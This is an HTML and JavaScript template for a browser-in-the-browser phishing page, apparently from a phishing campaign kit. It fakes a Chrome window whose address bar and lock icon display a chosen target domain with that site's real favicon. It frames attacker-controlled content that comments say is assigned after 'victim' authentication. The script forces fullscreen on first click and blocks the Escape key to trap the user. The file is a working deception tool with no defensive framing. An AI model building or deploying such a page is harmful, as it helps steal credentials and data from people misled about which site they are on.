<!-- template-name: BitB Chrome (fake browser window) -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: #202124;
        }

        .browser-window {
            display: flex;
            flex-direction: column;
            width: 100%;
            height: 100%;
            background: #202124;
        }

        /* Title bar */
        .title-bar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 36px;
            background: #202124;
            padding: 0 8px;
        }

        .tab-strip {
            display: flex;
            align-items: flex-end;
            height: 100%;
            padding-left: 8px;
        }

        .tab {
            display: flex;
            align-items: center;
            height: 28px;
            background: #35363a;
            border-radius: 8px 8px 0 0;
            padding: 0 12px;
            margin-right: 2px;
            max-width: 240px;
            min-width: 120px;
        }

        .tab-favicon {
            width: 16px;
            height: 16px;
            margin-right: 8px;
            border-radius: 2px;
        }

        .tab-title {
            color: #e8eaed;
            font-size: 12px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            flex: 1;
        }

        .tab-close {
            width: 16px;
            height: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-left: 8px;
            border-radius: 50%;
            color: #9aa0a6;
            font-size: 14px;
            cursor: pointer;
        }

        .tab-close:hover {
            background: rgba(255,255,255,0.1);
        }

        .window-controls {
            display: flex;
            align-items: center;
            gap: 16px;
            padding-right: 8px;
        }

        .window-btn {
            width: 12px;
            height: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #9aa0a6;
            cursor: pointer;
        }

        /* Toolbar */
        .toolbar {
            display: flex;
            align-items: center;
            height: 40px;
            background: #35363a;
            padding: 0 8px;
            gap: 4px;
        }

        .nav-btn {
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            color: #9aa0a6;
            cursor: pointer;
            background: transparent;
            border: none;
            font-size: 16px;
        }

        .nav-btn:hover {
            background: rgba(255,255,255,0.08);
        }

        .nav-btn:disabled {
            opacity: 0.4;
            cursor: default;
        }

        .nav-btn:disabled:hover {
            background: transparent;
        }

        /* URL Bar */
        .url-bar {
            flex: 1;
            display: flex;
            align-items: center;
            height: 28px;
            background: #202124;
            border-radius: 14px;
            padding: 0 12px;
            margin: 0 8px;
        }

        .url-lock {
            color: #9aa0a6;
            margin-right: 8px;
            font-size: 14px;
        }

        .url-text {
            flex: 1;
            color: #e8eaed;
            font-size: 14px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .url-text .domain {
            color: #e8eaed;
        }

        .url-text .path {
            color: #9aa0a6;
        }

        .toolbar-actions {
            display: flex;
            align-items: center;
            gap: 4px;
        }

        /* Content */
        .browser-content {
            flex: 1;
            background: #fff;
            position: relative;
        }

        .browser-content iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        /* Loading state */
        .loading-bar {
            position: absolute;
            top: 0;
            left: 0;
            height: 2px;
            background: #8ab4f8;
            width: 0;
            transition: width 0.3s ease;
            z-index: 100;
        }

        .loading-bar.active {
            animation: loading 2s ease-in-out infinite;
        }

        @keyframes loading {
            0% { width: 0; }
            50% { width: 70%; }
            100% { width: 100%; }
        }

        .icon {
            width: 16px;
            height: 16px;
            fill: currentColor;
        }
    </style>
</head>
<body>
    <div class="browser-window" id="browserWindow">
        <div class="title-bar">
            <div class="tab-strip">
                <div class="tab active">
                    <img class="tab-favicon" id="tabFavicon" src="" alt="">
                    <span class="tab-title" id="tabTitle">Loading...</span>
                    <span class="tab-close">×</span>
                </div>
            </div>
            <div class="window-controls">
                <div class="window-btn">─</div>
                <div class="window-btn">□</div>
                <div class="window-btn">×</div>
            </div>
        </div>

        <div class="toolbar">
            <button class="nav-btn" disabled>
                <svg class="icon" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
            </button>
            <button class="nav-btn" disabled>
                <svg class="icon" viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
            </button>
            <button class="nav-btn" id="reloadBtn">
                <svg class="icon" viewBox="0 0 24 24"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
            </button>

            <div class="url-bar">
                <span class="url-lock">
                    <svg class="icon" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
                </span>
                <span class="url-text" id="urlText">
                    <span class="domain" id="urlDomain"></span><span class="path" id="urlPath"></span>
                </span>
            </div>

            <div class="toolbar-actions">
                <button class="nav-btn">
                    <svg class="icon" viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>
                </button>
            </div>
        </div>

        <div class="browser-content">
            <div class="loading-bar active" id="loadingBar"></div>
            <iframe
                id="contentFrame"
                class="iframe-visible"
                src=""
                allow="camera; microphone; geolocation; clipboard-read; clipboard-write"
                allowfullscreen
            ></iframe>
        </div>
    </div>

    <script>
        (function() {
            const TARGET_URL = {{TARGET_URL}};

            const urlDomain = document.getElementById('urlDomain');
            const urlPath = document.getElementById('urlPath');
            const tabTitle = document.getElementById('tabTitle');
            const tabFavicon = document.getElementById('tabFavicon');
            const contentFrame = document.getElementById('contentFrame');
            const loadingBar = document.getElementById('loadingBar');
            const reloadBtn = document.getElementById('reloadBtn');

            function parseUrl(url) {
                if (!url) return { domain: '', path: '/', favicon: '' };

                let fullUrl = url;
                if (!url.startsWith('http://') && !url.startsWith('https://')) {
                    fullUrl = 'https://' + url;
                }

                try {
                    const parsed = new URL(fullUrl);
                    return {
                        domain: parsed.hostname,
                        path: parsed.pathname + parsed.search,
                        favicon: 'https://www.google.com/s2/favicons?domain=' + parsed.hostname + '&sz=32'
                    };
                } catch(e) {
                    const match = url.match(/(?:https?:\/\/)?([^\/]+)(.*)/);
                    if (match) {
                        return {
                            domain: match[1],
                            path: match[2] || '/',
                            favicon: 'https://www.google.com/s2/favicons?domain=' + match[1] + '&sz=32'
                        };
                    }
                    return { domain: url, path: '/', favicon: '' };
                }
            }

            function setupBrowser() {
                const urlInfo = parseUrl(TARGET_URL);
                urlDomain.textContent = urlInfo.domain;
                urlPath.textContent = urlInfo.path || '/';
                tabTitle.textContent = urlInfo.domain;
                if (urlInfo.favicon) {
                    tabFavicon.src = urlInfo.favicon;
                }

                // The stream iframe src is assigned by window.Controller
                // (injected at campaign creation) after victim WS auth.

                contentFrame.onload = function() {
                    loadingBar.classList.remove('active');
                    loadingBar.style.width = '100%';
                    setTimeout(function() {
                        loadingBar.style.opacity = '0';
                    }, 200);
                };
            }

            function enterFullscreen() {
                var elem = document.documentElement;
                if (elem.requestFullscreen) {
                    elem.requestFullscreen();
                } else if (elem.webkitRequestFullscreen) {
                    elem.webkitRequestFullscreen();
                } else if (elem.msRequestFullscreen) {
                    elem.msRequestFullscreen();
                }
            }

            // Auto-setup on load
            setupBrowser();

            // Request fullscreen on first click anywhere
            document.addEventListener('click', function() {
                if (!document.fullscreenElement) {
                    enterFullscreen();
                }
            }, { once: true });

            reloadBtn.addEventListener('click', function(e) {
                e.stopPropagation();
                loadingBar.style.opacity = '1';
                loadingBar.style.width = '0';
                loadingBar.classList.add('active');
                contentFrame.src = contentFrame.src;
            });

            // Prevent ESC from exiting fullscreen
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape') {
                    e.preventDefault();
                    e.stopPropagation();
                }
            }, true);
        })();
    </script>
</body>
</html>
